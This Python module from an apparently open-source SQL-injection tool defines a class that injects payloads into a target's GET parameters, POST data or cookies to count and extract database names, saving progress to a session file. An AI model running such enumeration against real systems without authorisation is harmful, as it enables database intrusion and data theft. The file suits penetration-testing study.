#!/usr/bin/python3
# -*- coding: utf-8 -*-
# pylint: disable=R,W,E,C

"""

Author  : Nasir Khan (r0ot h3x49)
Github  : https://github.com/r0oth3x49
License : MIT


Copyright (c) 2016-2025 Nasir Khan (r0ot h3x49)

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the
Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software,
and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR
ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH 
THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

"""
from xpath.common.session import session
from xpath.injector.request import request
from xpath.logger.colored_logger import logger
from xpath.common.payloads import PAYLOADS_DBS_COUNT, PAYLOADS_DBS_NAMES
from xpath.common.lib import sqlite3, compat_urlencode, DBS_STATEMENT, collections
from xpath.common.utils import prepare_injection_payload


class DatabasesExtractor(object):
    def __init__(
        self,
        url,
        data="",
        payload="",
        regex="",
        cookies="",
        injected_param="",
        session_filepath="",
    ):
        self.url = url
        self.data = data
        self.payload = payload.replace("0x72306f746833783439", "{banner}")
        self.cookies = cookies
        self.regex = regex
        self.session_filepath = session_filepath
        self._injected_param = injected_param

    def _perpare_querystring(self, text, payload):
        payload = compat_urlencode(payload)
        payload = prepare_injection_payload(
            text=text, payload=payload, param=self._injected_param
        )
        return payload

    def _generat_payload(self, payloads_list):
        payloads = []
        for p in payloads_list:
            payload = self.payload.format(banner=p)
            payloads.append(payload)
        return payloads

    def _generate_dbs_payloads(self, dbs_count, payload, index=0):
        payload = "{index},".join(payload.rsplit("0,"))
        payloads = [payload.format(index=i) for i in range(index, dbs_count)]
        return payloads

    @property
    def _dbs_count(self):
        payloads = self._generat_payload(payloads_list=PAYLOADS_DBS_COUNT)
        return self._extact(payloads=payloads)

    @property
    def dbs_names(self):
        is_resumed = False
        index = 0
        fetched_data = {}
        _temp = []
        DatabasesResponse = collections.namedtuple(
            "DatabasesResponse", ["fetched", "count", "databases"]
        )
        try:
            fetched_data = session.fetch_from_table(
                session_filepath=self.session_filepath,
                table_name="tbl_databases",
                cursor=False,
            )
            if fetched_data:
                is_resumed = True
        except Exception as error:
            pass
        logger.info("fetching database names")
        retval = self._dbs_count
        if retval.is_injected:
            dbs_count = int(retval.result)
            logger.info("used SQL query returns %d entries" % (dbs_count))
            if is_resumed:
                for entry in fetched_data:
                    name = entry.get("dbname")
                    if name not in _temp:
                        _temp.append(name)
                    logger.info(f"resumed: '{name}'")
                    index += 1
            should_fetch = True
            if is_resumed:
                if len(fetched_data) == dbs_count:
                    should_fetch = False
            if should_fetch:
                payloads = self._generat_payload(payloads_list=PAYLOADS_DBS_NAMES)
                retval = self._extact(payloads=payloads)
                if retval.is_injected:
                    payload = retval.payload
                    payloads = self._generate_dbs_payloads(
                        dbs_count=dbs_count, payload=payload, index=index
                    )
                    response_data = self._extract_dbs(payloads=payloads)
                    if response_data.is_fetched:
                        _temp.extend(response_data.result)
                    self._available_dbs(dbs_count, _temp)
                    return DatabasesResponse(
                        fetched=True, count=dbs_count, databases=_temp
                    )
                if not retval.is_injected:
                    status_code = retval.status_code
                    error = retval.error
                    count = retval.payloads_count
                    if status_code not in [200, 0]:
                        logger.warning("HTTP error codes detected during run:")
                        message = f"{error} - {count} times"
                        logger.http_error(message)
                    else:
                        message = f"tested with '{count}' queries, unable to find working SQL query."
                        logger.critical(message)
            else:
                self._available_dbs(dbs_count, _temp)
                return DatabasesResponse(fetched=True, count=dbs_count, databases=_temp)
        if not retval.is_injected:
            status_code = retval.status_code
            error = retval.error
            count = retval.payloads_count
            if status_code not in [200, 0]:
                logger.warning("HTTP error codes detected during run:")
                message = f"{error} - {count} times"
                logger.http_error(message)
            else:
                message = f"tested with '{count}' queries, unable to find working SQL query."
                logger.critical(message)
        return DatabasesResponse(fetched=False, count=0, databases=_temp)

    def _available_dbs(self, count, databases):
        logger.success(f"available databases [{count}]:")
        for db in databases:
            logger.success(f"[*] : {db}")

    def _extract_dbs(self, payloads):
        _temp, index = [], 0
        Response = collections.namedtuple("Response", ["is_fetched", "result"])

        while index < len(payloads):
            p = payloads[index]
            url = self.url
            data = self.data
            regex = self.regex
            cookies = self.cookies
            if self.url and not self.data and not self.cookies:
                # GET
                url = self._perpare_querystring(self.url, p)
            if self.url and self.data and not self.cookies:
                # POST
                data = self._perpare_querystring(self.data, p)
            if self.url and not self.data and self.cookies:
                # COOKIES
                cookies = self._perpare_querystring(self.cookies, p)
            try:
                response = request.inject_payload(
                    url=url, regex=regex, data=data, cookies=cookies
                )
            except KeyboardInterrupt:
                logger.warning(
                    "user aborted during enumeration. Xpath will display partial output"
                )
                break
            else:
                if response.ok:
                    result = response.result
                    logger.info("retrieved: '%s'" % (result))
                    _temp.append(result)
                    _ = session.dump(
                        session_filepath=self.session_filepath,
                        query=DBS_STATEMENT.format(dbname=result),
                    )
                index += 1

        if _temp and len(_temp) > 0:
            _temp = list(set(_temp))
            resp = Response(is_fetched=True, result=_temp)
        else:
            resp = Response(is_fetched=True, result=_temp)
        return resp
